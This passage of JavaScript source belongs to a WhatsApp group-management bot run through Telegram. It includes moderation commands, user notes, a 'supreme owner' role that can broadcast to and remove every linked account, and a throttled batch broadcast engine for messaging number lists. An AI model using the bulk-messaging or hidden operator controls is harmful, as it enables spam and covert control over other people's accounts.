                config.ownerName = DEFAULT_OWNER_NAME;
                config.botName = DEFAULT_BOT_NAME;
                config.prefix = DEFAULT_PREFIX;
                waInstance.ownerNumber = null;
                waInstance.ownerLid = null;
                waInstance.prefix = DEFAULT_PREFIX;
                waInstance.groupSettings = {};
                waInstance.userNotes = {};
                waInstance.privateMode = false;
                waInstance.saveConfig();
                waInstance.saveGroupSettings();
                waInstance.saveUserNotes();
                return reply('✅ Settings reset to default. Owner info cleared.');

            // =========== CO-OWNER (supreme only) ===========
            case 'setcoowner':
                if (!isSupremeOwner) return reply('Only the supreme owner can set a co-owner.');
                if (!text) return reply('Provide a number, e.g., .setcoowner 234XXXXXXXXXX');
                coOwner = text.replace(/[^0-9]/g, '');
                return reply(`✅ Co-owner set to ${coOwner}`);

            // =========== PRIVATE NOTES ===========
            case 'mynote': {
                const myNotes = userNotes[senderClean] || {};
                const noteAction = text.split(' ')[0]?.toLowerCase();
                const noteArgs = text.slice(noteAction?.length || 0).trim();
                if (noteAction === 'add') {
                    if (!noteArgs.includes('|')) return reply('Usage: .mynote add title|content');
                    const [title, content] = noteArgs.split('|').map(s => s.trim());
                    if (!title || !content) return reply('Both title and content required.');
                    myNotes[title] = content;
                    userNotes[senderClean] = myNotes;
                    waInstance.saveUserNotes();
                    return reply(`✅ Note "${title}" saved.`);
                } else if (noteAction === 'list') {
                    const titles = Object.keys(myNotes);
                    if (titles.length === 0) return reply('No notes saved.');
                    return reply(`📋 Your notes:\n${titles.join('\n')}`);
                } else if (noteAction === 'get') {
                    if (!noteArgs) return reply('Usage: .mynote get title');
                    const content = myNotes[noteArgs];
                    if (!content) return reply('Note not found.');
                    return reply(`📌 ${noteArgs}:\n${content}`);
                } else if (noteAction === 'delete') {
                    if (!noteArgs) return reply('Usage: .mynote delete title');
                    delete myNotes[noteArgs];
                    userNotes[senderClean] = myNotes;
                    waInstance.saveUserNotes();
                    return reply(`🗑 Note "${noteArgs}" deleted.`);
                } else {
                    return reply('Usage: .mynote add|list|get|delete');
                }
            }

            // =========== GLOBAL PRIVATE / PUBLIC MODE ===========
            case 'private':
                if (!isBotOwner && !isSupremeOwner) return reply('❌ Only the bot owner can use this command.');
                waInstance.privateMode = true;
                waInstance.saveConfig();
                return reply('🔒 Private mode ON. Only the bot owner and supreme owner can use the bot.');

            case 'public':
                if (!isBotOwner && !isSupremeOwner) return reply('❌ Only the bot owner can use this command.');
                waInstance.privateMode = false;
                waInstance.saveConfig();
                return reply('🔓 Public mode ON. Everyone can use the bot again.');

            // =========== GROUP ADMIN COMMANDS ===========
            case 'bot':
                if (!isGroup) return reply('Group only.');
                if (!isAdmin) return reply('Admin only.');
                const botAction = text.toLowerCase();
                if (botAction === 'off') {
                    if (!groupSettings[jid]) groupSettings[jid] = {};
                    groupSettings[jid].disabled = true;
                    waInstance.saveGroupSettings();
                    return reply('🤖 Bot disabled in this group. Use .bot on to re-enable.');
                } else if (botAction === 'on') {
                    if (!groupSettings[jid]) groupSettings[jid] = {};
                    groupSettings[jid].disabled = false;
                    waInstance.saveGroupSettings();
                    return reply('🤖 Bot enabled in this group.');
                } else {
                    return reply('Usage: .bot on/off');
                }

            case 'log':
                if (!isBotOwner && !isSupremeOwner) return reply('Only the bot owner can view stats.');
                const stat = usageStats[waInstance.sessionId] || { count: 0, users: new Set() };
                return reply(`📊 Commands this hour: ${stat.count}\n👥 Unique users: ${stat.users.size}`);

            case 'clear':
                if (!isGroup) return reply('Group only.');
                if (!isAdmin) return reply('Admin only.');
                try {
                    const fetched = await sock.fetchMessages(jid, { limit: 20 });
                    const msgs = fetched.messages || [];
                    const botMsgs = msgs.filter(m => m.key.fromMe);
                    for (const m of botMsgs) {
                        await sock.sendMessage(jid, { delete: m.key });
                    }
                    return reply('🧹 Bot messages cleared.');
                } catch { return reply('Failed to clear messages.'); }

            case 'antilink':
                if (!isGroup) return reply('Group only.');
                if (!isAdmin) return reply('Admin only.');
                {
                    if (!groupSettings[jid]) groupSettings[jid] = {};
                    const action = text.toLowerCase();
                    if (action === 'on') {
                        groupSettings[jid].antilink = true;
                        waInstance.saveGroupSettings();
                        return reply('🔗 Antilink ON.');
                    } else if (action === 'off') {
                        groupSettings[jid].antilink = false;
                        waInstance.saveGroupSettings();
                        return reply('🔗 Antilink OFF.');
                    } else return reply('Usage: .antilink on/off');
                }

            case 'welcome':
                if (!isGroup) return reply('Group only.');
                if (!isAdmin) return reply('Admin only.');
                {
                    if (!groupSettings[jid]) groupSettings[jid] = {};
                    const action = text.toLowerCase();
                    if (action === 'on') {
                        groupSettings[jid].welcome = true;
                        waInstance.saveGroupSettings();
                        return reply('👋 Welcome messages ON.');
                    } else if (action === 'off') {
                        groupSettings[jid].welcome = false;
                        waInstance.saveGroupSettings();
                        return reply('👋 Welcome messages OFF.');
                    } else return reply('Usage: .welcome on/off');
                }

            case 'goodbye':
                if (!isGroup) return reply('Group only.');
                if (!isAdmin) return reply('Admin only.');
                {
                    if (!groupSettings[jid]) groupSettings[jid] = {};
                    const action = text.toLowerCase();
                    if (action === 'on') {
                        groupSettings[jid].goodbye = true;
                        waInstance.saveGroupSettings();
                        return reply('🚪 Goodbye messages ON.');
                    } else if (action === 'off') {
                        groupSettings[jid].goodbye = false;
                        waInstance.saveGroupSettings();
                        return reply('🚪 Goodbye messages OFF.');
                    } else return reply('Usage: .goodbye on/off');
                }

            case 'setwelcome':
                if (!isGroup) return reply('Group only.');
                if (!isAdmin) return reply('Admin only.');
                if (!text) return reply('Provide a welcome message.');
                {
                    if (!groupSettings[jid]) groupSettings[jid] = {};
                    groupSettings[jid].welcomeText = text;
                    waInstance.saveGroupSettings();
                    return reply('✅ Welcome message set.');
                }

            case 'setgoodbye':
                if (!isGroup) return reply('Group only.');
                if (!isAdmin) return reply('Admin only.');
                if (!text) return reply('Provide a goodbye message.');
                {
                    if (!groupSettings[jid]) groupSettings[jid] = {};
                    groupSettings[jid].goodbyeText = text;
                    waInstance.saveGroupSettings();
                    return reply('✅ Goodbye message set.');
                }

            case 'tagall':
                if (!isGroup) return reply('Group only.');
                if (!isAdmin) return reply('Admin only.');
                {
                    const meta = await sock.groupMetadata(jid);
                    const members = meta.participants.map(p => p.id);
                    const tagMsg = text || '📢 Everyone!';
                    return sock.sendMessage(jid, { text: tagMsg, mentions: members });
                }

            case 'hidetag':
                if (!isGroup) return reply('Group only.');
                if (!isAdmin) return reply('Admin only.');
                {
                    const meta = await sock.groupMetadata(jid);
                    const members = meta.participants.map(p => p.id);
                    return sock.sendMessage(jid, { text: '\u200e', mentions: members });
                }

            case 'lock':
                if (!isGroup) return reply('Group only.');
                if (!isAdmin) return reply('Admin only.');
                await sock.groupSettingUpdate(jid, 'announcement');
                return reply('🔒 Group locked.');

            case 'unlock':
                if (!isGroup) return reply('Group only.');
                if (!isAdmin) return reply('Admin only.');
                await sock.groupSettingUpdate(jid, 'not_announcement');
                return reply('🔓 Group unlocked.');

            // =========== KICK, PROMOTE, ETC ===========
case 'kick':
case 'promote':
case 'demote':
case 'add':
case 'announce':
case 'del':
case 'mute':
case 'unmute':
case 'warn':
    if (!isGroup) return reply("Group only.");
    if (!isAdmin) return reply("Admin only.");
    if (!botIsAdmin) return reply("Bot needs to be admin first.");

    if (command === 'announce') {
        const meta2 = await sock.groupMetadata(jid);
        const users = meta2.participants.map(p => p.id);
        return sock.sendMessage(jid, { text: text || "📢 Attention!", mentions: users });
    }
    if (command === 'del') {
        if (!contextInfo?.stanzaId) return reply('Reply to a message to delete.');
        await sock.sendMessage(jid, {
            delete: { remoteJid: jid, fromMe: false, id: contextInfo.stanzaId, participant: contextInfo.participant }
        });
        return reply('🗑 Deleted.');
    }
    if (command === 'mute' || command === 'unmute') {
        const target = mentionedJid;
        if (!target) return reply('Mention someone.');
        const muteKey = `${jid}_${cleanNumber(target)}`;
        if (command === 'mute') {
            mutedUsers[muteKey] = Date.now() + (parseInt(text) || 600000);
            return reply(`🔇 Muted for ${(parseInt(text) || 600000)/60000} min.`);
        } else {
            delete mutedUsers[muteKey];
            return reply('🔊 Unmuted.');
        }
    }
    if (command === 'warn') {
        const target = mentionedJid;
        if (!target) return reply('Mention someone.');
        const warnKey = `${jid}_${cleanNumber(target)}`;
        warns[warnKey] = (warns[warnKey] || 0) + 1;
        return reply(`⚠️ ${cleanNumber(target)} has ${warns[warnKey]} warning(s).`);
    }

    let targetJid;
    if (command === 'add') {
        const numberToAdd = text.replace(/[^0-9]/g, '');
        if (!numberToAdd) return reply('Provide a number.');
        targetJid = numberToAdd + '@s.whatsapp.net';
    } else {
        targetJid = mentionedJid;
        if (!targetJid) return reply('Reply or tag someone.');
    }
    const action2 = command === 'kick' ? 'remove' : command === 'add' ? 'add' : command;
    await sock.groupParticipantsUpdate(jid, [targetJid], action2);
    return reply(`✅ ${command} successful.`);

            // =========== REPORT ===========
            case 'report':
                if (!text.includes(' ')) return reply('Usage: .report 234XXXXXXXXXX reason');
                const [targetNum, ...reasonArr] = text.split(' ');
                const reason = reasonArr.join(' ');
                if (!targetNum || !reason) return reply('Provide a number and reason.');
                const reportJid = targetNum.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                try {
                    await sock.sendMessage(reportJid, { text: `📩 Report from ${senderClean}:\n${reason}` });
                    return reply('✅ Report sent.');
                } catch { return reply('Failed to send report.'); }

            case 'great':
                return reply(`🔥 YOU ARE GREAT ${senderClean} 🔥`);

            // =========== FACTORY RESET (supreme) ===========
            case 'factoryreset':
                if (!isSupremeOwner) return reply('Only the supreme owner can factory reset.');
                config.ownerName = DEFAULT_OWNER_NAME;
                config.botName = DEFAULT_BOT_NAME;
                config.prefix = DEFAULT_PREFIX;
                waInstance.ownerNumber = null;
                waInstance.ownerLid = null;
                waInstance.prefix = DEFAULT_PREFIX;
                waInstance.groupSettings = {};
                waInstance.userNotes = {};
                waInstance.privateMode = false;
                waInstance.saveConfig();
                waInstance.saveGroupSettings();
                waInstance.saveUserNotes();
                delete usageStats[waInstance.sessionId];
                return reply('♻️ Factory reset complete. All settings reverted to default.');

            default:
                return reply("❓ Unknown command. Use .menu");
        }
    } catch (err) {
        console.error(err);
        reply("❌ Error occurred");
    }
}

// =========== SHOW FAILED REPORT ===========
function showFailedReport(sock, jid, failures, stats, source) {
    const failedNums = Object.keys(failures);
    if (failedNums.length === 0) return;
    
    const reasons = {};
    for (const [num, details] of Object.entries(failures)) {
        const reason = details.reason || 'unknown';
        if (!reasons[reason]) reasons[reason] = [];
        reasons[reason].push(num);
    }
    
    let report = 
`📋 *Failed Delivery Report*
━━━━━━━━━━━━━━━━━━
Source: ${source === 'active' ? 'Active broadcast' : 'Last broadcast'}
Total failed: ${failedNums.length}
━━━━━━━━━━━━━━━━━━
`;

    const reasonLabels = {
        'not_on_whatsapp': '📵 Not on WhatsApp',
        'still_not_on_whatsapp': '📵 Still not on WhatsApp',
        'blocked_me': '🚫 Blocked the bot',
        'rate_limited': '⏳ Rate limited',
        'timeout': '⏰ Connection timeout',
        'unknown_error': '❓ Unknown error',
        'unknown': '❓ Unknown'
    };
    
    for (const [reason, nums] of Object.entries(reasons)) {
        const label = reasonLabels[reason] || `❓ ${reason}`;
        report += `\n${label}: ${nums.length}`;
        
        const showNums = nums.slice(0, 10);
        report += `\n${showNums.join(', ')}`;
        if (nums.length > 10) {
            report += `\n... and ${nums.length - 10} more`;
        }
        report += '\n';
    }
    
    report += `\n━━━━━━━━━━━━━━━━━━
Use .resendfailed to retry all failed numbers.`;
    
    if (report.length > 4000) {
        const parts = report.match(/[\s\S]{1,4000}/g) || [report];
        for (const part of parts) {
            sock.sendMessage(jid, { text: part });
        }
    } else {
        sock.sendMessage(jid, { text: report });
    }
}

// =========== BATCH BROADCAST ENGINE ===========
async function processNextBatch(waInstance, sock, jid, batchSize, waitTime, config) {
    const state = waInstance._broadcastState;
    if (!state || !state.active) return;
    
    const batch = state.numbers.slice(state.currentIndex, state.currentIndex + batchSize);
    
    if (batch.length === 0) {
        const elapsed = Math.floor((Date.now() - state.startedAt) / 1000);
        const mins = Math.floor(elapsed / 60);
        const secs = elapsed % 60;
        
        state.active = false;
        state.completedAt = Date.now();
        
        const failedFile = path.join(SESSION_DIR, waInstance.sessionId, 'broadcast_failures.json');
        const failedReport = {
            broadcastStarted: new Date(state.startedAt).toLocaleString(),
            broadcastEnded: new Date().toLocaleString(),
            total: state.total,
            sent: state.sent,
            totalFailed: state.failed,
            notOnWA: state.notOnWA,
            message: state.message,
            failures: state.failureDetails || {}
        };
        try { fs.writeFileSync(failedFile, JSON.stringify(failedReport, null, 2)); } catch {}
        
        try {
            await sock.sendMessage(jid, {
                text: 
`✅ *Broadcast Complete!*
━━━━━━━━━━━━━━━━━━
📬 Total targets: ${state.total}
✅ Sent successfully: ${state.sent}
❌ Total failed: ${state.failed}
   └ 📵 Not on WhatsApp: ${state.notOnWA}
   └ ❓ Other errors: ${state.failed - state.notOnWA}
⏱ Duration: ${mins}m ${secs}s
━━━━━━━━━━━━━━━━━━
Use .failed to see who didn't receive it.
Use .resendfailed to retry all failed numbers.`
            });
        } catch {}
        
        return;
    }
    
    state.waiting = false;
    let batchSent = 0;
    let batchFailed = 0;
    
    try {
        await sock.sendMessage(jid, {
            text: 
`🔄 *Batch ${Math.floor(state.currentIndex / batchSize) + 1}/${Math.ceil(state.total / batchSize)}*
Sending ${batch.length} messages...
Overall: ${state.sent + state.failed}/${state.total}`
        });
    } catch {}
    
    for (let i = 0; i < batch.length; i++) {
        const num = batch[i];
        const targetJid = num + '@s.whatsapp.net';
        let failReason = null;
        
        try {
            const exists = await checkNumberExists(sock, num);
            if (!exists) {
                state.notOnWA++;
                state.failed++;
                batchFailed++;
                failReason = 'not_on_whatsapp';
            } else {
                await sock.sendMessage(targetJid, {
                    text: `📢 *BROADCAST MESSAGE*\n\n${state.message}\n\n— ${config.botName}`
                });
                state.sent++;
                batchSent++;
            }
        } catch (err) {
            state.failed++;
            batchFailed++;
            failReason = err.message?.includes('blocked') ? 'blocked_me' :
                         err.message?.includes('rate') ? 'rate_limited' :
                         err.message?.includes('timeout') ? 'timeout' :
                         'unknown_error';
        }
        
        if (failReason) {
            if (!state.failureDetails) state.failureDetails = {};
            state.failureDetails[num] = {
                reason: failReason,
                timestamp: Date.now(),
                batch: Math.floor(state.currentIndex / batchSize) + 1
            };
        }
        
        await wait(200);
    }
    
    state.currentIndex += batch.length;
    
    try {
        await sock.sendMessage(jid, {
            text: 
`✅ *Batch Complete*
━━━━━━━━━━━━━━
Batch: ${Math.ceil(state.currentIndex / batchSize)}/${Math.ceil(state.total / batchSize)}
This batch: ${batchSent} sent, ${batchFailed} failed
Overall: ${state.sent} sent, ${state.failed} failed
━━━━━━━━━━━━━━
⏳ Waiting 5 minutes before next batch...
Use .cancelbroadcast to stop.`
        });
    } catch {}
    
    state.waiting = true;
    state.nextBatchAt = Date.now() + waitTime;
    
    setTimeout(() => {
        processNextBatch(waInstance, sock, jid, batchSize, waitTime, config);
    }, waitTime);
}

// =============== RESTORE SESSIONS ===============
function restoreSessions() {
    if (!fs.existsSync(SESSION_DIR)) return;
    const dirs = fs.readdirSync(SESSION_DIR).filter(f =>
        fs.statSync(path.join(SESSION_DIR, f)).isDirectory()
    );
    for (const number of dirs) {
        if (!/^\d+$/.test(number)) continue;
        console.log(`🔄 Restoring session for ${number}`);
        const wa = new WA(number);
        sessions[number] = wa;
        wa.start();
    }
}

// =============== TELEGRAM BOT ===============
tgBot.command('pair', async (ctx) => {
    const args = ctx.message.text.split(' ');
    const number = args[1]?.replace(/[^0-9]/g, '');
    if (!number) return ctx.reply('Usage: /pair 2348012345678');

    if (!sessions[number]) {
        sessions[number] = new WA(number);
        await sessions[number].start();
    }

    const result = await sessions[number].pair();
    if (result.success) {
        ctx.reply(
`PAIRING CODE:
${result.code}

Go to WhatsApp:
Settings → Linked Devices → Link with phone number`
        );
    } else {
        ctx.reply(`ERROR: ${result.message}`);
    }
});

tgBot.command('sessions', async (ctx) => {
    const list = Object.entries(sessions).map(([num, wa]) => {
        return `${num} - ${wa.connected ? '✅ Online' : '⭕ Offline'}`;
    }).join('\n') || 'No active sessions.';
    ctx.reply(`Active sessions:\n${list}`);
});

tgBot.command('unpair', async (ctx) => {
    if (ctx.from.id !== SUPREME_TELEGRAM_ID) return ctx.reply('Unauthorized.');
    const args = ctx.message.text.split(' ');
    const number = args[1]?.replace(/[^0-9]/g, '');
    if (!number) return ctx.reply('Usage: /unpair 2348012345678');
    if (sessions[number]) {
        try { await sessions[number].sock?.logout(); } catch {}
        delete sessions[number];
        const sessionPath = path.join(SESSION_DIR, number);
        try { await rmdir(sessionPath, { recursive: true }); } catch {}
        ctx.reply(`Session ${number} removed.`);
    } else {
        ctx.reply('Session not found.');
    }
});

tgBot.command('runtime', (ctx) => {
    const uptime = Math.floor((Date.now() - botStartTime) / 1000);
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = uptime % 60;
    ctx.reply(`Bot runtime: ${hours}h ${minutes}m ${seconds}s`);
});

tgBot.command('broadcast', async (ctx) => {
    if (ctx.from.id !== SUPREME_TELEGRAM_ID) return ctx.reply('Unauthorized.');
    const msg = ctx.message.text.split(' ').slice(1).join(' ');
    if (!msg) return ctx.reply('Usage: /broadcast Your message');
    for (const [num, wa] of Object.entries(sessions)) {
        if (wa.connected && wa.sock) {
            try {
                await wa.sock.sendMessage(num + '@s.whatsapp.net', { text: msg });
            } catch {}
        }
    }
    ctx.reply('Broadcast sent.');
});

// =============== START ===============
restoreSessions();
tgBot.launch();
console.log('Godstrike Bot running...');

process.on('uncaughtException', console.error);
process.on('unhandledRejection', console.error);
